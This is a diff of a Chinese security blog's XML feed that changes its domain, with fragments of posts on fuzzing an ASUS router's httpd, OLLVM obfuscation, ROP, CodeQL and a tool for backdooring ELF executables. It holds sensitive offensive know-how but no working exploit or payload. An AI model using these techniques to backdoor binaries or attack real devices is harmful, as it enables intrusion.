+        <id>https://chenx6.uk/post/fail_firm_fuzz/</id>
         
-        <content type="html" xml:base="https://chenx6.github.io/post/fail_firm_fuzz/">&lt;p&gt;这是我第一次对华硕路由器的 httpd 进行 fuzz。结果 fuzz 出来的结果没有经过实机测试，就提交上去了，然后就是华硕的安全团队复现不出来...为什么复现不出来，在本文总结处进行分析。本文主要讲我在进行固件 fuzz 时的具体过程。&lt;&#x2F;p&gt;
+        <content type="html" xml:base="https://chenx6.uk/post/fail_firm_fuzz/">&lt;p&gt;这是我第一次对华硕路由器的 httpd 进行 fuzz。结果 fuzz 出来的结果没有经过实机测试，就提交上去了，然后就是华硕的安全团队复现不出来...为什么复现不出来，在本文总结处进行分析。本文主要讲我在进行固件 fuzz 时的具体过程。&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;代码分析&#x2F;逆向工程&quot;&gt;代码分析&#x2F;逆向工程&lt;&#x2F;h2&gt;
 &lt;p&gt;华硕路由器的大部分源代码是公开的，可以在官网上下载到，并且有个开源的 &lt;a rel=&quot;external&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;RMerl&#x2F;asuswrt-merlin.ng&quot;&gt;RMerl&#x2F;asuswrt-merlin.ng&lt;&#x2F;a&gt;。阅读源代码发现， httpd 的源代码中间调用了些博通的库，没法直接用编译器进行插桩。所以就当作源码不存在，直接下载二进制文件进行无文件 fuzz 了...&lt;&#x2F;p&gt;
 &lt;blockquote&gt;
@@ -3622,7 +3622,7 @@ $$&lt;&#x2F;p&gt;
 &lt;pre class=&quot;giallo&quot; style=&quot;color-scheme: light dark; color: light-dark(#90A4AE, #BABED8); background-color: light-dark(#FAFAFA, #292D3E);&quot;&gt;&lt;code data-lang=&quot;c&quot;&gt;&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: light-dark(#39ADB5, #89DDFF);font-style: italic;&quot;&gt;#&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#39ADB5, #89DDFF);font-style: italic;&quot;&gt;define&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#6182B8, #82AAFF);&quot;&gt; _GNU_SOURCE&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;&lt;h3 id=&quot;出现_&#x2F;dev&#x2F;nvram:_Permission_denied&quot;&gt;出现 &lt;code&gt;&#x2F;dev&#x2F;nvram: Permission denied&lt;&#x2F;code&gt;&lt;&#x2F;h3&gt;
 &lt;p&gt;宿主机上肯定没有 &lt;code&gt;&#x2F;dev&#x2F;nvram&lt;&#x2F;code&gt; 啊，所以使用 QEMU 进行模拟时使用了 &lt;a rel=&quot;external&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;firmadyne&#x2F;libnvram&quot;&gt;firmadyne&#x2F;libnvram&lt;&#x2F;a&gt; 这个库 Hook 掉 nvram 的相关操作，然后将这个库添加到 &lt;code&gt;LD_PRELOAD&lt;&#x2F;code&gt; 中。在使用时如果发现这个库没有创建 tmpfs 进行存储的话，那就手动用 &lt;code&gt;sudo mount -t tmpfs -o size=10M tmpfs $挂载路径&lt;&#x2F;code&gt; 创建一个。可以修改 &lt;code&gt;config.h&lt;&#x2F;code&gt; 实现将挂载路径放在别的目录下。例如我将挂载路径改动到了 &lt;code&gt;&#x2F;mnt&#x2F;libnvram&lt;&#x2F;code&gt;。&lt;&#x2F;p&gt;
 &lt;h3 id=&quot;Hook___uClibc_main_直接调用_handle_request&quot;&gt;Hook &lt;code&gt;__uClibc_main&lt;&#x2F;code&gt; 直接调用 &lt;code&gt;handle_request&lt;&#x2F;code&gt;&lt;&#x2F;h3&gt;
-&lt;p&gt;根据 &lt;a href=&quot;https:&#x2F;&#x2F;chenx6.github.io&#x2F;post&#x2F;fail_firm_fuzz&#x2F;#refs&quot;&gt;Modern Vulnerability Research Techniques on Embedded Systems&lt;&#x2F;a&gt; 这篇文章，我通过 Hook &lt;code&gt;__uClibc_main&lt;&#x2F;code&gt; 来实现直接 fuzz &lt;code&gt;handle_request&lt;&#x2F;code&gt; 函数。&lt;&#x2F;p&gt;
+&lt;p&gt;根据 &lt;a href=&quot;https:&#x2F;&#x2F;chenx6.uk&#x2F;post&#x2F;fail_firm_fuzz&#x2F;#refs&quot;&gt;Modern Vulnerability Research Techniques on Embedded Systems&lt;&#x2F;a&gt; 这篇文章，我通过 Hook &lt;code&gt;__uClibc_main&lt;&#x2F;code&gt; 来实现直接 fuzz &lt;code&gt;handle_request&lt;&#x2F;code&gt; 函数。&lt;&#x2F;p&gt;
 &lt;p&gt;由于在解析 http 请求时，程序使用了 fgets 等 c 语言相关函数，所以我决定使用普通的文件流代替 TCP 流。&lt;&#x2F;p&gt;
 &lt;p&gt;动态库的主要功能就是初始化被 fuzz 程序的相关变量，将 fuzz 的输入塞到程序中，然后运行函数，最后查看运行结果。&lt;&#x2F;p&gt;
 &lt;pre class=&quot;giallo&quot; style=&quot;color-scheme: light dark; color: light-dark(#90A4AE, #BABED8); background-color: light-dark(#FAFAFA, #292D3E);&quot;&gt;&lt;code data-lang=&quot;c&quot;&gt;&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: light-dark(#90A4AE, #676E95);font-style: italic;&quot;&gt;&#x2F;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#90A4AE, #676E95);font-style: italic;&quot;&gt; gcc main_hook.c -o main_hook.so -fPIC -shared -ldl&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
@@ -3720,7 +3720,7 @@ $$&lt;&#x2F;p&gt;
 &lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;        temp_lst&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#39ADB5, #89DDFF);&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#6182B8, #82AAFF);&quot;&gt;clear&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#39ADB5, #89DDFF);&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#39ADB5, #89DDFF);&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
 &lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;        begin_record&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#39ADB5, #89DDFF);&quot;&gt; =&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#39ADB5, #89DDFF);&quot;&gt; False&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
 &lt;span class=&quot;giallo-l&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;&lt;h3 id=&quot;获取字典&quot;&gt;获取字典&lt;&#x2F;h3&gt;
-&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;chenx6.github.io&#x2F;post&#x2F;fail_firm_fuzz&#x2F;#refs&quot;&gt;AFLplusplus&#x2F;AFLplusplus&lt;&#x2F;a&gt; 项目中的 &lt;code&gt;dictionaries&lt;&#x2F;code&gt; 目录中就有一些字典，可以拿来使用。&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;chenx6.uk&#x2F;post&#x2F;fail_firm_fuzz&#x2F;#refs&quot;&gt;AFLplusplus&#x2F;AFLplusplus&lt;&#x2F;a&gt; 项目中的 &lt;code&gt;dictionaries&lt;&#x2F;code&gt; 目录中就有一些字典，可以拿来使用。&lt;&#x2F;p&gt;
 &lt;h3 id=&quot;使用_ramdisk&quot;&gt;使用 ramdisk&lt;&#x2F;h3&gt;
 &lt;p&gt;由于 fuzz 比较消耗硬盘读写，所以通过下面的命令，使用内存盘减少硬盘消耗。&lt;&#x2F;p&gt;
 &lt;pre class=&quot;giallo&quot; style=&quot;color-scheme: light dark; color: light-dark(#90A4AE, #BABED8); background-color: light-dark(#FAFAFA, #292D3E);&quot;&gt;&lt;code data-lang=&quot;shellscript&quot;&gt;&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: light-dark(#E2931D, #FFCB6B);&quot;&gt;mkdir&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#91B859, #C3E88D);&quot;&gt; &#x2F;mnt&#x2F;ramdisk&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
@@ -3745,7 +3745,7 @@ $$&lt;&#x2F;p&gt;
 &lt;p&gt;使用 master&#x2F;slave 模式启动多个 fuzzer 进行 fuzz，提高 fuzz 效率。&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;总结&quot;&gt;总结&lt;&#x2F;h2&gt;
 &lt;p&gt;这是一篇时隔几个月才写的复现文章，之前还是比较忙，所以没时间写文章。&lt;&#x2F;p&gt;
-&lt;p&gt;在这几个月里，我突然明白了为什么报上去的漏洞别人复现不了，因为 &lt;a href=&quot;https:&#x2F;&#x2F;chenx6.github.io&#x2F;post&#x2F;fail_firm_fuzz&#x2F;#refs&quot;&gt;firmadyne&#x2F;libnvram&lt;&#x2F;a&gt; 这个项目在 key 不存在时返回了 NULL，然后 httpd 中的部分地方又没有对值为 NULL 的情况做处理，测试时找的网络上的路由器可能存在着已经被新版本修复的漏洞，所以才会碰巧“测试成功”。然而真机在通常情况下存在这个 key，并且修复了大量的漏洞，所以复现失败。&lt;&#x2F;p&gt;
+&lt;p&gt;在这几个月里，我突然明白了为什么报上去的漏洞别人复现不了，因为 &lt;a href=&quot;https:&#x2F;&#x2F;chenx6.uk&#x2F;post&#x2F;fail_firm_fuzz&#x2F;#refs&quot;&gt;firmadyne&#x2F;libnvram&lt;&#x2F;a&gt; 这个项目在 key 不存在时返回了 NULL，然后 httpd 中的部分地方又没有对值为 NULL 的情况做处理，测试时找的网络上的路由器可能存在着已经被新版本修复的漏洞，所以才会碰巧“测试成功”。然而真机在通常情况下存在这个 key，并且修复了大量的漏洞，所以复现失败。&lt;&#x2F;p&gt;
 &lt;p&gt;当然，如果有人看完这篇文章，并且借助这篇文章的经验挖到了洞，能不能给我留个评论，让我膜拜一下...&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;refs&quot;&gt;refs&lt;&#x2F;h2&gt;
 &lt;p&gt;参考文章&lt;&#x2F;p&gt;
@@ -3772,10 +3772,10 @@ $$&lt;&#x2F;p&gt;
           </name>
         </author>
         
-        <link rel="alternate" type="text/html" href="https://chenx6.github.io/post/rewrite_ollvm_fla/"/>
-        <id>https://chenx6.github.io/post/rewrite_ollvm_fla/</id>
+        <link rel="alternate" type="text/html" href="https://chenx6.uk/post/rewrite_ollvm_fla/"/>
+        <id>https://chenx6.uk/post/rewrite_ollvm_fla/</id>
         
-        <content type="html" xml:base="https://chenx6.github.io/post/rewrite_ollvm_fla/">&lt;p&gt;OLLVM 的控制流平坦化是逆向老哥最讨厌的混淆了，因为一旦使用就代表着 IDA 的 decompiler 彻底报废了。所以了解并在&lt;a rel=&quot;external&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;chenx6&#x2F;baby_obfuscator&quot;&gt;自己的项目中&lt;&#x2F;a&gt;重写控制流平坦化挺重要的。&lt;&#x2F;p&gt;
+        <content type="html" xml:base="https://chenx6.uk/post/rewrite_ollvm_fla/">&lt;p&gt;OLLVM 的控制流平坦化是逆向老哥最讨厌的混淆了，因为一旦使用就代表着 IDA 的 decompiler 彻底报废了。所以了解并在&lt;a rel=&quot;external&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;chenx6&#x2F;baby_obfuscator&quot;&gt;自己的项目中&lt;&#x2F;a&gt;重写控制流平坦化挺重要的。&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;什么是控制流平坦化&quot;&gt;什么是控制流平坦化&lt;&#x2F;h2&gt;
 &lt;h3 id=&quot;名词解释&quot;&gt;名词解释&lt;&#x2F;h3&gt;
 &lt;h4 id=&quot;BasicBlock&quot;&gt;BasicBlock&lt;&#x2F;h4&gt;
@@ -3783,7 +3783,7 @@ $$&lt;&#x2F;p&gt;
 &lt;h3 id=&quot;语言描述控制流平坦化的实现&quot;&gt;语言描述控制流平坦化的实现&lt;&#x2F;h3&gt;
 &lt;p&gt;在 OLLVM 中，Pass 先实现一个永真循环，然后再在这个循环中放入 switch 语句，将代码中除了开始块的所有 BasicBlock 放入这个 switch 语句的不同 case 中，通过修改 switch 的条件，来实现 BasicBlock 之间的跳转。&lt;&#x2F;p&gt;
 &lt;h3 id=&quot;可行的修复方法&quot;&gt;可行的修复方法&lt;&#x2F;h3&gt;
-&lt;p&gt;在 &lt;a href=&quot;https:&#x2F;&#x2F;chenx6.github.io&#x2F;post&#x2F;rewrite_ollvm_fla&#x2F;#refs&quot;&gt;利用符号执行去除控制流平坦化&lt;&#x2F;a&gt; 讲解了恢复控制流平坦化的方法，并且在 &lt;a href=&quot;https:&#x2F;&#x2F;chenx6.github.io&#x2F;post&#x2F;rewrite_ollvm_fla&#x2F;#refs&quot;&gt;cq674350529&#x2F;deflat&lt;&#x2F;a&gt; 使用了 angr 进行实现。&lt;&#x2F;p&gt;
+&lt;p&gt;在 &lt;a href=&quot;https:&#x2F;&#x2F;chenx6.uk&#x2F;post&#x2F;rewrite_ollvm_fla&#x2F;#refs&quot;&gt;利用符号执行去除控制流平坦化&lt;&#x2F;a&gt; 讲解了恢复控制流平坦化的方法，并且在 &lt;a href=&quot;https:&#x2F;&#x2F;chenx6.uk&#x2F;post&#x2F;rewrite_ollvm_fla&#x2F;#refs&quot;&gt;cq674350529&#x2F;deflat&lt;&#x2F;a&gt; 使用了 angr 进行实现。&lt;&#x2F;p&gt;
 &lt;p&gt;这里引用腾讯 SRC 的思路概括&lt;&#x2F;p&gt;
 &lt;blockquote&gt;
 &lt;ol&gt;
@@ -3979,7 +3979,7 @@ $$&lt;&#x2F;p&gt;
 &lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;ConstantInt &lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#39ADB5, #89DDFF);&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt;caseCond &lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#39ADB5, #89DDFF);&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; swInst&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#39ADB5, #89DDFF);&quot;&gt;-&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#6182B8, #82AAFF);&quot;&gt;findCaseDest&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#39ADB5, #89DDFF);&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#39ADB5, #89DDFF);&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt;originBB&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#39ADB5, #89DDFF);&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#6182B8, #82AAFF);&quot;&gt;begin&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#39ADB5, #89DDFF);&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#39ADB5, #89DDFF);&quot;&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#39ADB5, #89DDFF);&quot;&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#39ADB5, #89DDFF);&quot;&gt;;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
 &lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;storeRng&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#39ADB5, #89DDFF);&quot;&gt;-&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#6182B8, #82AAFF);&quot;&gt;setOperand&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#39ADB5, #89DDFF);&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#F76D47, #F78C6C);&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#39ADB5, #89DDFF);&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt; caseCond&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#39ADB5, #89DDFF);&quot;&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#39ADB5, #89DDFF);&quot;&gt;;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
 &lt;blockquote&gt;
-&lt;p&gt;图请参考 &lt;a href=&quot;https:&#x2F;&#x2F;chenx6.github.io&#x2F;post&#x2F;rewrite_ollvm_fla&#x2F;#refs&quot;&gt;Obfuscator-llvm源码分析&lt;&#x2F;a&gt;，用 ASCII 画图有点麻烦...&lt;&#x2F;p&gt;
+&lt;p&gt;图请参考 &lt;a href=&quot;https:&#x2F;&#x2F;chenx6.uk&#x2F;post&#x2F;rewrite_ollvm_fla&#x2F;#refs&quot;&gt;Obfuscator-llvm源码分析&lt;&#x2F;a&gt;，用 ASCII 画图有点麻烦...&lt;&#x2F;p&gt;
 &lt;&#x2F;blockquote&gt;
 &lt;h2 id=&quot;总结&quot;&gt;总结&lt;&#x2F;h2&gt;
 &lt;p&gt;这个控制流平坦化的代码数量也不多，而且程序的逻辑在理清后很容易理解，所以文章的篇幅很短。&lt;&#x2F;p&gt;
@@ -4005,10 +4005,10 @@ $$&lt;&#x2F;p&gt;
           </name>
         </author>
         
-        <link rel="alternate" type="text/html" href="https://chenx6.github.io/post/different-rop/"/>
-        <id>https://chenx6.github.io/post/different-rop/</id>
+        <link rel="alternate" type="text/html" href="https://chenx6.uk/post/different-rop/"/>
+        <id>https://chenx6.uk/post/different-rop/</id>
         
-        <content type="html" xml:base="https://chenx6.github.io/post/different-rop/">&lt;p&gt;看了许多讲 ROP 的文章，发现很多只是讲了怎么利用，但是没有讲为什么这么利用。所以写文记录。&lt;&#x2F;p&gt;
+        <content type="html" xml:base="https://chenx6.uk/post/different-rop/">&lt;p&gt;看了许多讲 ROP 的文章，发现很多只是讲了怎么利用，但是没有讲为什么这么利用。所以写文记录。&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;什么是_ROP&quot;&gt;什么是 ROP&lt;&#x2F;h2&gt;
 &lt;p&gt;ROP (Return orient programming) 是一种漏洞利用方法，使得攻击者绕过保护(例如 NX 栈不可执行)执行恶意代码。攻击者通过栈溢出等手段实现覆盖返回地址劫持程序控制流，并且通过不同的代码片段(Gadgets)来拼接出攻击者希望执行的代码。&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;怎么进行_ROP&quot;&gt;怎么进行 ROP&lt;&#x2F;h2&gt;
@@ -4209,10 +4209,10 @@ $$&lt;&#x2F;p&gt;
           </name>
         </author>
         
-        <link rel="alternate" type="text/html" href="https://chenx6.github.io/post/codeql/"/>
-        <id>https://chenx6.github.io/post/codeql/</id>
+        <link rel="alternate" type="text/html" href="https://chenx6.uk/post/codeql/"/>
+        <id>https://chenx6.uk/post/codeql/</id>
         
-        <content type="html" xml:base="https://chenx6.github.io/post/codeql/">&lt;h2 id=&quot;概要&quot;&gt;概要&lt;&#x2F;h2&gt;
+        <content type="html" xml:base="https://chenx6.uk/post/codeql/">&lt;h2 id=&quot;概要&quot;&gt;概要&lt;&#x2F;h2&gt;
 &lt;p&gt;之前在 Twitter 上看到有大佬说 Github Learning Club 上搞了个免费的 CodeQL 课程，课程最终目标是使用 CodeQL 这个语言找出 uboot 中的 9 个漏洞。我在克服拖延症后，终于在 4 月底完成了这个课程，于是写文记录。&lt;&#x2F;p&gt;
 &lt;p&gt;&lt;a rel=&quot;external&quot; href=&quot;https:&#x2F;&#x2F;lab.github.com&#x2F;githubtraining&#x2F;codeql-u-boot-challenge-(cc++)&quot;&gt;课程链接&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
 &lt;p&gt;&lt;a rel=&quot;external&quot; href=&quot;https:&#x2F;&#x2F;securitylab.github.com&#x2F;research&#x2F;uboot-rce-nfs-vulnerability&quot;&gt;通过 CodeQL 找出来的漏洞分析&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
@@ -4364,10 +4364,10 @@ $$&lt;&#x2F;p&gt;
           </name>
         </author>
         
-        <link rel="alternate" type="text/html" href="https://chenx6.github.io/post/n1_modify/"/>
-        <id>https://chenx6.github.io/post/n1_modify/</id>
+        <link rel="alternate" type="text/html" href="https://chenx6.uk/post/n1_modify/"/>
+        <id>https://chenx6.uk/post/n1_modify/</id>
         
-        <content type="html" xml:base="https://chenx6.github.io/post/n1_modify/">&lt;p&gt;最近想搞一台小服务器来做 Git 服务器，下载 Bt 等事情，所以就在一堆便宜的 ARM 机顶盒&#x2F;NAS 中间挑选。最后看上了 100 RMB 左右的斐讯 N1，因为 N1 不用拆机就可以刷机。&lt;&#x2F;p&gt;
+        <content type="html" xml:base="https://chenx6.uk/post/n1_modify/">&lt;p&gt;最近想搞一台小服务器来做 Git 服务器，下载 Bt 等事情，所以就在一堆便宜的 ARM 机顶盒&#x2F;NAS 中间挑选。最后看上了 100 RMB 左右的斐讯 N1，因为 N1 不用拆机就可以刷机。&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;准备工作&quot;&gt;准备工作&lt;&#x2F;h2&gt;
 &lt;ul&gt;
 &lt;li&gt;空 U 盘&lt;&#x2F;li&gt;
@@ -4438,10 +4438,10 @@ $$&lt;&#x2F;p&gt;
           </name>
         </author>
         
-        <link rel="alternate" type="text/html" href="https://chenx6.github.io/post/lc3-vm/"/>
-        <id>https://chenx6.github.io/post/lc3-vm/</id>
+        <link rel="alternate" type="text/html" href="https://chenx6.uk/post/lc3-vm/"/>
+        <id>https://chenx6.uk/post/lc3-vm/</id>
         
-        <content type="html" xml:base="https://chenx6.github.io/post/lc3-vm/">&lt;p&gt;本文是根据 &lt;a rel=&quot;external&quot; href=&quot;https:&#x2F;&#x2F;justinmeiners.github.io&#x2F;lc3-vm&quot;&gt;https:&#x2F;&#x2F;justinmeiners.github.io&#x2F;lc3-vm&lt;&#x2F;a&gt; 和 &lt;a rel=&quot;external&quot; href=&quot;https:&#x2F;&#x2F;justinmeiners.github.io&#x2F;lc3-vm&#x2F;supplies&#x2F;lc3-isa.pdf&quot;&gt;https:&#x2F;&#x2F;justinmeiners.github.io&#x2F;lc3-vm&#x2F;supplies&#x2F;lc3-isa.pdf&lt;&#x2F;a&gt; ISA 写出 LC3 VM 的实现过程。&lt;&#x2F;p&gt;
+        <content type="html" xml:base="https://chenx6.uk/post/lc3-vm/">&lt;p&gt;本文是根据 &lt;a rel=&quot;external&quot; href=&quot;https:&#x2F;&#x2F;justinmeiners.github.io&#x2F;lc3-vm&quot;&gt;https:&#x2F;&#x2F;justinmeiners.github.io&#x2F;lc3-vm&lt;&#x2F;a&gt; 和 &lt;a rel=&quot;external&quot; href=&quot;https:&#x2F;&#x2F;justinmeiners.github.io&#x2F;lc3-vm&#x2F;supplies&#x2F;lc3-isa.pdf&quot;&gt;https:&#x2F;&#x2F;justinmeiners.github.io&#x2F;lc3-vm&#x2F;supplies&#x2F;lc3-isa.pdf&lt;&#x2F;a&gt; ISA 写出 LC3 VM 的实现过程。&lt;&#x2F;p&gt;
 &lt;p&gt;代码已上传到了 Github 上：&lt;a rel=&quot;external&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;chenx6&#x2F;lc3-vm&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;chenx6&#x2F;lc3-vm&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;LC3_架构&quot;&gt;LC3 架构&lt;&#x2F;h2&gt;
 &lt;h3 id=&quot;内存&quot;&gt;内存&lt;&#x2F;h3&gt;
@@ -4852,10 +4852,10 @@ $$&lt;&#x2F;p&gt;
           </name>
         </author>
         
-        <link rel="alternate" type="text/html" href="https://chenx6.github.io/post/build_pass_out_of_tree/"/>
-        <id>https://chenx6.github.io/post/build_pass_out_of_tree/</id>
+        <link rel="alternate" type="text/html" href="https://chenx6.uk/post/build_pass_out_of_tree/"/>
+        <id>https://chenx6.uk/post/build_pass_out_of_tree/</id>
         
-        <content type="html" xml:base="https://chenx6.github.io/post/build_pass_out_of_tree/">&lt;p&gt;在网络上流传的编译 LLVM Pass 都需要一份 LLVM 源码，从整个源代码编译，编译非常花时间 (i7 6700HQ 使用 &lt;code&gt;make -j8&lt;&#x2F;code&gt; 编译整个项目花了近 50 分钟)，所以在翻阅文档时发现 LLVM 支持在代码树外编译，在 1 分钟内编译一个 Pass，还是非常香的。&lt;&#x2F;p&gt;
+        <content type="html" xml:base="https://chenx6.uk/post/build_pass_out_of_tree/">&lt;p&gt;在网络上流传的编译 LLVM Pass 都需要一份 LLVM 源码，从整个源代码编译，编译非常花时间 (i7 6700HQ 使用 &lt;code&gt;make -j8&lt;&#x2F;code&gt; 编译整个项目花了近 50 分钟)，所以在翻阅文档时发现 LLVM 支持在代码树外编译，在 1 分钟内编译一个 Pass，还是非常香的。&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;项目配置&quot;&gt;项目配置&lt;&#x2F;h2&gt;
 &lt;h3 id=&quot;项目目录结构&quot;&gt;项目目录结构&lt;&#x2F;h3&gt;
 &lt;p&gt;本次作为示范的 OLLVM 是一个使用 LLVM Pass 进行代码混淆的项目。他的主要文件在于 &lt;code&gt;${LLVM 项目目录}&#x2F;lib&#x2F;Transforms&#x2F;Obfuscation&#x2F;&lt;&#x2F;code&gt; 和 &lt;code&gt;${LLVM 项目目录}&#x2F;include&#x2F;llvm&#x2F;Transforms&#x2F;Obfuscation&#x2F;&lt;&#x2F;code&gt;。将这两个目录下的文件放入对应的目录就可以在代码树外编译 OLLVM 了。OLLVM 相关的文件可以在 &lt;a rel=&quot;external&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;obfuscator-llvm&#x2F;&#x2F;obfuscator&#x2F;tree&#x2F;llvm-4.0&quot;&gt;GitHub&lt;&#x2F;a&gt; 找到。&lt;&#x2F;p&gt;
@@ -5157,10 +5157,10 @@ $$&lt;&#x2F;p&gt;
           </name>
         </author>
         
-        <link rel="alternate" type="text/html" href="https://chenx6.github.io/post/elf_backdoor/"/>
-        <id>https://chenx6.github.io/post/elf_backdoor/</id>
+        <link rel="alternate" type="text/html" href="https://chenx6.uk/post/elf_backdoor/"/>
+        <id>https://chenx6.uk/post/elf_backdoor/</id>
         
-        <content type="html" xml:base="https://chenx6.github.io/post/elf_backdoor/">&lt;p&gt;在渗透测试中，给常用的可执行文件加上后门是很常见的操作。但是之前的加后门 &quot;The backdoor factory&quot; 已经不维护了，而且还是 Python2 写的，代码质量也...所以我自己尝试着重新用 Python3 造了个轮子。在造轮子的过程中，由于 APUE 扔在学校里面了，导致在写和系统相关的汇编时出现了一些翻车情况...&lt;&#x2F;p&gt;
+        <content type="html" xml:base="https://chenx6.uk/post/elf_backdoor/">&lt;p&gt;在渗透测试中，给常用的可执行文件加上后门是很常见的操作。但是之前的加后门 &quot;The backdoor factory&quot; 已经不维护了，而且还是 Python2 写的，代码质量也...所以我自己尝试着重新用 Python3 造了个轮子。在造轮子的过程中，由于 APUE 扔在学校里面了，导致在写和系统相关的汇编时出现了一些翻车情况...&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;加后门的流程&quot;&gt;加后门的流程&lt;&#x2F;h2&gt;
 &lt;p&gt;基本分为两部分，先分析 ELF，然后根据之前的分析来给 ELF 加个&quot;补丁&quot;。&lt;&#x2F;p&gt;
 &lt;ol&gt;
@@ -5420,10 +5420,10 @@ $$&lt;&#x2F;p&gt;
           </name>
         </author>
         
-        <link rel="alternate" type="text/html" href="https://chenx6.github.io/post/obfuscate_string/"/>
-        <id>https://chenx6.github.io/post/obfuscate_string/</id>
+        <link rel="alternate" type="text/html" href="https://chenx6.uk/post/obfuscate_string/"/>
+        <id>https://chenx6.uk/post/obfuscate_string/</id>
         
-        <content type="html" xml:base="https://chenx6.github.io/post/obfuscate_string/">&lt;p&gt;这个项目可以作为我看了这么久 LLVM 的 Docs 助眠的一个小总结吧。这个项目主要就是给函数使用的常量字符串进行加密，在程序被静态分析的时候干扰分析。当然找到思路后，这个混淆还是很容易解开的。&lt;&#x2F;p&gt;
+        <content type="html" xml:base="https://chenx6.uk/post/obfuscate_string/">&lt;p&gt;这个项目可以作为我看了这么久 LLVM 的 Docs 助眠的一个小总结吧。这个项目主要就是给函数使用的常量字符串进行加密，在程序被静态分析的时候干扰分析。当然找到思路后，这个混淆还是很容易解开的。&lt;&#x2F;p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;吐槽下，网上的文章质量参差不齐，写的让人不知所云的，真的恐怖。所以还是面向 Stackoverflow 和官方文档编程吧...&lt;&#x2F;p&gt;
 &lt;&#x2F;blockquote&gt;
@@ -5837,10 +5837,10 @@ $$&lt;&#x2F;p&gt;
           </name>
         </author>
         
-        <link rel="alternate" type="text/html" href="https://chenx6.github.io/post/rewrite_ollvm_bcf/"/>
-        <id>https://chenx6.github.io/post/rewrite_ollvm_bcf/</id>
+        <link rel="alternate" type="text/html" href="https://chenx6.uk/post/rewrite_ollvm_bcf/"/>
+        <id>https://chenx6.uk/post/rewrite_ollvm_bcf/</id>
         
